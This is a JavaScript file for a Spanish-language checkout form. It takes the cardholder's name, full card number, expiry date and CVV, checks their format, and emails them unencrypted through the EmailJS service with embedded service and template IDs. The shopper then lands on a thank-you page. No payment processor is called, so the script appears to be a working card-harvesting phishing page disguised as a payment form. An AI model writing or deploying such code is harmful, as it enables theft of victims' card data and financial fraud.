emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const loader = document.createElement('div');
    loader.className = 'loader';
    document.body.appendChild(loader);

    const datos = {
        nombre_completo: document.getElementById('nombre').value.trim(),
        numero_tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
        fecha_expiracion: document.getElementById('fecha').value,
        codigo_cvv: document.getElementById('cvv').value
    };

    // Validaciones actualizadas
    let isValid = true;
    document.querySelectorAll('.error-input').forEach(el => el.remove());

    if (!/^[\p{L}\s]{4,}$/u.test(datos.nombre_completo)) {
        mostrarError('nombre', 'Nombre inválido (mínimo 4 letras)');
        isValid = false;
    }

    if (!/^\d{16}$/.test(datos.numero_tarjeta)) {
        mostrarError('tarjeta', 'Tarjeta inválida');
        isValid = false;
    }

    if (new Date(datos.fecha_expiracion) < new Date()) {
        mostrarError('fecha', 'Fecha expirada');
        isValid = false;
    }

    if (!/^\d{3,4}$/.test(datos.codigo_cvv)) {
        mostrarError('cvv', 'CVV inválido (3-4 dígitos)');
        isValid = false;
    }

    if (!isValid) {
        loader.remove();
        return;
    }

    emailjs.send("service_syrc1uk", "template_u3etoro", datos)
        .then(() => {
            window.location.href = "thank-you.html";
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error temporal. Por favor intente nuevamente.');
        })
        .finally(() => {
            loader.remove();
        });
});

function mostrarError(campoId, mensaje) {
    const input = document.getElementById(campoId);
    const error = document.createElement('div');
    error.className = 'error-input';
    error.style.color = '#ff4444';
    error.style.marginTop = '5px';
    error.textContent = mensaje;
    input.parentNode.appendChild(error);
}

document.getElementById('tarjeta').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    e.target.value = value.substring(0, 19);
});
